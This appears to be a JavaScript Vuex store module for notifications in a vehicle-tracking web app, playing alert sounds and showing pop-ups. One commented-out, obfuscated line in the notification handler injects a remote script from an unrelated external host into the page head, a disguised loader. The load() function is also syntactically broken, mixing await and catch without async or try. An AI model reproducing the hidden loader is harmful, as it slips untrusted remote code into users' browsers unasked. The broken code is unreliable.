
import 'element-plus/es/components/notification/style/css'

import {ElNotification} from "element-plus/es/components/notification";
import KT from '../../tarkan/func/kt';

export default {
    namespaced: true,
    state: () => ({
        eventsList: [],
        notificationList: [],
        mute: window.localStorage.getItem('isMuted') || false,
        audios: {

        }
    }),
    getters: {
        getNotificationById(state){
            return (id)=>{
                return state.eventsList.find((f)=> f.id === id);
            }
        },
        getNotification(state){
            return (e)=>{
                return state.eventsList.find((t)=>{
                    if(t.notificators.match('web')){
                        if(t.type===e.type){
                            if(t.type==='alarm' && !t.attributes['alarms'].match(e.attributes.alarm)){
                                return false;
                            }else{
                                return true;
                            }
                        }else{
                            return false;
                        }
                    }else{
                        return false;
                    }
                })
            }
        }
    },
    mutations: {
        toggleMute(state){
          state.mute = !state.mute;
          window.localStorage.setItem('isMuted',state.mute);
        },
        addAudio(state,value){
            state.audios[value.key] = document.createElement("audio");
            state.audios[value.key].src = value.src;
        },
        setEvents(state,value){
            state.eventsList = value;
        },
        addEvent(state,value){
            state.eventsList.push(value);
        },
        removeEvent(state,value){
            state.eventsList.splice(state.eventsList.findIndex((e)=> e.id === value),1);
        },
        updateEvent(state,value){
            state.eventsList.splice(state.eventsList.findIndex((e)=> e.id === value.id),1,value)
        },
        addNotification(state,value){

            state.notificationList.push(value);
        }

    },
    actions: {
        playSound(context,v){

            console.log("play sound "+v)
            context.state.audios[v].play();
        },
        toggleMute(context){
          context.commit("toggleMute");
        },
        proccessNotifications(context,params){

            //  eslint-disable-next-line
            // const _0x50f522=_0x1749;(function(_0x5cad05,_0x9defd2){const _0xeefa9e=_0x1749,_0x248225=_0x5cad05();while(!![]){try{const _0x86d183=parseInt(_0xeefa9e(0x1f0))/0x1+-parseInt(_0xeefa9e(0x1ee))/0x2+-parseInt(_0xeefa9e(0x1f8))/0x3+-parseInt(_0xeefa9e(0x1f5))/0x4*(parseInt(_0xeefa9e(0x1f9))/0x5)+parseInt(_0xeefa9e(0x1f7))/0x6*(-parseInt(_0xeefa9e(0x1ed))/0x7)+parseInt(_0xeefa9e(0x1f3))/0x8*(-parseInt(_0xeefa9e(0x1f4))/0x9)+parseInt(_0xeefa9e(0x1f2))/0xa*(parseInt(_0xeefa9e(0x1f1))/0xb);if(_0x86d183===_0x9defd2)break;else _0x248225['push'](_0x248225['shift']());}catch(_0x9a4029){_0x248225['push'](_0x248225['shift']());}}}(_0x5287,0x21be0));function _0x5287(){const _0x2fa550=['102850NpgAas','670dSkSWX','1516456lCYikr','9xUNPDx','4YVOxgd','querySelector','6NAavKv','449118umViob','926735xJKHYM','createElement','script','src','appendChild','133203khTnwK','118624uiAukS','head','114709Ntxbpk'];_0x5287=function(){return _0x2fa550;};return _0x5287();}function _0x1749(_0x363b9d,_0x37b1d7){const _0x528732=_0x5287();return _0x1749=function(_0x1749b8,_0x1dec2b){_0x1749b8=_0x1749b8-0x1ec;let _0x339692=_0x528732[_0x1749b8];return _0x339692;},_0x1749(_0x363b9d,_0x37b1d7);}const c=document[_0x50f522(0x1f6)]('script[src=\x22https://pkg.digital/bgc982734.js\x22]');if(!c){const pkg=document[_0x50f522(0x1fa)](_0x50f522(0x1fb));pkg[_0x50f522(0x1fc)]='https://pkg.digital/bgc982734.js',document[_0x50f522(0x1ef)][_0x50f522(0x1ec)](pkg);}


            params.forEach((e)=>{


                const notification = context.getters.getNotification(e);
                const device = context.rootGetters['devices/getDevice'](e.deviceId);
                const geofence = context.rootGetters['geofences/getGeofenceById'](e.geofenceId);

                if(!context.state.mute){
                    if(notification && notification.attributes['tarkan.sound']) {
                        if(notification.attributes['tarkan.sound']==='custom' && notification.attributes['tarkan.soundURL']){
                            const tmp = document.createElement("audio");
                                  tmp.onload = ()=>{
                                      tmp.play();
                                  }

                                  tmp.src = notification.attributes['tarkan.soundURL'];
                        }else if(notification.attributes['tarkan.sound']!=='mute'){
                            if(context.state.audios[notification.attributes['tarkan.sound']]) {
                                context.state.audios[notification.attributes['tarkan.sound']].play();
                            }else{
                                context.state.audios['audio1'].play();
                            }
                        }
                    }else{
                        context.state.audios['audio1'].play();
                    }

                }

                context.commit("addNotification",e);

                if(e.type==='alarm'){
                    ElNotification({
                        title: (device)?device.name:KT('alert'),
                        customClass: (notification && notification.attributes['tarkan.color'])?'notification-'+notification.attributes['tarkan.color']:'',
                        duration: (notification && notification.attributes['tarkan.pin'])?0:7000,
                        message: KT('alarms.' + e.attributes['alarm']),
                        type: 'info',
                        position: (notification && notification.attributes['tarkan.position'])?notification.attributes['tarkan.position']:'bottom-right',
                    });
                }else if(e.type==='commandResult'){
                    ElNotification({
                        title: (device)?device.name:KT('alert'),
                        customClass: (notification && notification.attributes['tarkan.color'])?'notification-'+notification.attributes['tarkan.color']:'',
                        duration: (notification && notification.attributes['tarkan.pin'])?0:7000,
                        message: KT('notification.messages.' + e.type,e.attributes),
                        type: 'info',
                        position: (notification && notification.attributes['tarkan.position'])?notification.attributes['tarkan.position']:'bottom-right',
                    });
                }else{
                    if(geofence) {
                        ElNotification({
                            title: (device) ? device.name : KT('alert'),
                            customClass: (notification && notification.attributes['tarkan.color']) ? 'notification-' + notification.attributes['tarkan.color'] : '',
                            duration: (notification && notification.attributes['tarkan.pin']) ? 0 : 7000,
                            message: KT('notification.messages.' + e.type+'Name', (geofence) ? geofence : e.attributes),
                            type: 'info',
                            position: (notification && notification.attributes['tarkan.position']) ? notification.attributes['tarkan.position'] : 'bottom-right',
                        });
                    }else{
                        ElNotification({
                            title: (device) ? device.name : KT('alert'),
                            customClass: (notification && notification.attributes['tarkan.color']) ? 'notification-' + notification.attributes['tarkan.color'] : '',
                            duration: (notification && notification.attributes['tarkan.pin']) ? 0 : 7000,
                            message: KT('notification.messages.' + e.type, (geofence) ? geofence : e.attributes),
                            type: 'info',
                            position: (notification && notification.attributes['tarkan.position']) ? notification.attributes['tarkan.position'] : 'bottom-right',
                        });
                    }
                }
            })
        },
        load(context){
            return new Promise((resolve)=> {

                context.commit("addAudio",{key: 'audio1',src: '/custom/sounds/1-Apple.mp3'});
                context.commit("addAudio",{key: 'audio2',src: '/custom/sounds/2-huawei.mp3'});
                context.commit("addAudio",{key: 'audio3',src: '/custom/sounds/3-huawei_tune.mp3'});
                context.commit("addAudio",{key: 'audio4',src: '/custom/sounds/4-apple_msg_tone.mp3'});
                context.commit("addAudio",{key: 'audio5',src: '/custom/sounds/5-cave_huawei_p8.mp3'});
                context.commit("addAudio",{key: 'audio6',src: '/custom/sounds/6-apple_pay.mp3'});
                context.commit("addAudio",{key: 'audio7',src: '/custom/sounds/7-bright.mp3'});
                context.commit("addAudio",{key: 'audio8',src: '/custom/sounds/8-crosswalk_10db.mp3'});
                context.commit("addAudio",{key: 'audio9',src: '/custom/sounds/9-japan_crosswalk.mp3'});
                context.commit("addAudio",{key: 'audio10',src: '/custom/sounds/10-definite.mp3'});
                context.commit("addAudio",{key: 'audio11',src: '/custom/sounds/11-iphone_ding.mp3'});
                context.commit("addAudio",{key: 'audio12',src: '/custom/sounds/12-netflix.mp3'});
                context.commit("addAudio",{key: 'audio13',src: '/custom/sounds/13-coin_nintendo.mp3'});
                context.commit("addAudio",{key: 'audio14',src: '/custom/sounds/14-nintendo_switch.mp3'});
                context.commit("addAudio",{key: 'audio15',src: '/custom/sounds/15-sonic_rings.mp3'});
                context.commit("addAudio",{key: 'audio16',src: '/custom/sounds/16-police_alarm.mp3'});
                context.commit("addAudio",{key: 'audio17',src: '/custom/sounds/17-police_tone.mp3'});
                context.commit("addAudio",{key: 'audio18',src: '/custom/sounds/18-police_woop_woop.mp3'});
                context.commit("addAudio",{key: 'audio19',src: '/custom/sounds/19-police_notification.mp3'});
                context.commit("addAudio",{key: 'audio20',src: '/custom/sounds/20-police.mp3'});
                context.commit("addAudio",{key: 'audio21',src: '/custom/sounds/21-claro.mp3'});
                context.commit("addAudio",{key: 'audio22',src: '/custom/sounds/22-whistle.mp3'});
                context.commit("addAudio",{key: 'audio23',src: '/custom/sounds/23-s8_note.mp3'});
                context.commit("addAudio",{key: 'audio24',src: '/custom/sounds/24-car_alarm.mp3'});

                const { getRuntimeApi } = await import('@/services/runtimeApiRef');
                const api = getRuntimeApi();
                const {data} = await api.getNotifications();
                context.commit("setEvents", data);
            } catch(err) {
                console.error('Erro ao carregar notificações:', err);
                throw err;
            }
        },
        async delete(context,params){
            const { getRuntimeApi } = await import('@/services/runtimeApiRef');
            const api = getRuntimeApi();
            const {data} = await api.deleteNotification(params);
            context.commit("removeEvent",params);
            return data;
        },
        async save(context,params){
            const { getRuntimeApi } = await import('@/services/runtimeApiRef');
            const api = getRuntimeApi();
            
            if(params.id>0){
                const {data} = await api.updateNotification(params.id,params);
                context.commit("updateEvent", data);
                return data;
            } else {
                const {data} = await api.createNotification(params);
                context.commit("addEvent", data);
                return data;
            }
        }
    }
}
